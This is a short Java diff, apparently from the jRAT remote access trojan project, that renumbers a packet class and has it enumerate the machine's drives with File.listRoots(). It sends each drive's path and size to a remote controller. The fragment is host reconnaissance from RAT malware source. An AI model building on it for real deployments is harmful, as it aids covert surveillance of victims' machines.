@@ -6,17 +6,14 @@ import java.io.File;
 import se.jrat.common.io.StringWriter;
 
 
-public class Packet62InitDrives extends AbstractOutgoingPacket {
-
-	private File[] drives;
-
-	public Packet62InitDrives(File[] drives) {
-		this.drives = drives;
-	}
+public class Packet17InitDrives extends AbstractOutgoingPacket {
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
+		File[] drives = File.listRoots();
+		
 		dos.writeInt(drives.length);
+		
 		for (File drive : drives) {
 			sw.writeLine(drive.getAbsolutePath());
 			dos.writeShort((int) (drive.getTotalSpace() / 1024L / 1024L / 1024L));
@@ -27,7 +24,7 @@ public class Packet62InitDrives extends AbstractOutgoingPacket {
 
 	@Override
 	public byte getPacketId() {
-		return (byte) 62;
+		return (byte) 17;
 	}
 
 }
